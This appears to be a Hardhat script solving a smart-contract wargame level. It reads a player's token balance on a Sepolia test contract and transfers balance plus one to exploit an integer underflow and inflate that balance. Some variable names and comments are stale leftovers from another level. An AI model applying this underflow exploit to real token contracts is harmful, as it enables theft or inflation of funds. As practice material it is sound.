const { ethers, upgrades } = require("hardhat");
const hre = require("hardhat");
// const ethers = require('ethers').ethers;
const dotenv = require('dotenv').config();
const dotenvExpand = require('dotenv-expand');

const CoinFlipAttackAbi = require('../../artifacts/contracts/005/Token.sol/Token.json');

// use interpolation for .env variables
dotenvExpand(dotenv);

// const RPC_NODE = 'http://localhost:8545';
const RPC_NODE = process.env.SEPOLIA;
// no need to use attack contract. call main contract directly
const DEPLOYED_CONTRACT_ADDRESS = '0x924197A764090A9bE2B75a8d21C4Ab6297353C85';
const WALLET_ADDRESS = '0x482E046e2C76c1d0C3b082574C6a05a4B1D5D7C9';
const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000';
let ACCOUNTS;

const getAccounts = async () => {
  return ACCOUNTS = await ethers.getSigners();
};

const main = async () => {
  await getAccounts();
  if (!RPC_NODE) { console.log('skipping blockchain check'); return true; }

  const provider = new ethers.providers.JsonRpcProvider(RPC_NODE);
  const contract = new ethers.Contract(ethers.utils.getAddress(DEPLOYED_CONTRACT_ADDRESS), CoinFlipAttackAbi.abi, provider);
  
  // call attack contract
  const playerBalance = await contract.connect(ACCOUNTS[0]).balanceOf(WALLET_ADDRESS);
  console.log('playerBalance', playerBalance.toNumber());

  const randomAddress = '0x95222290dd7278aa3ddd389cc1e1d165cc4bafe5';
  await contract.connect(ACCOUNTS[0]).transfer(randomAddress, playerBalance.toNumber() + 1);
  console.log('Action performed on contract:', contract.address);
};


main();
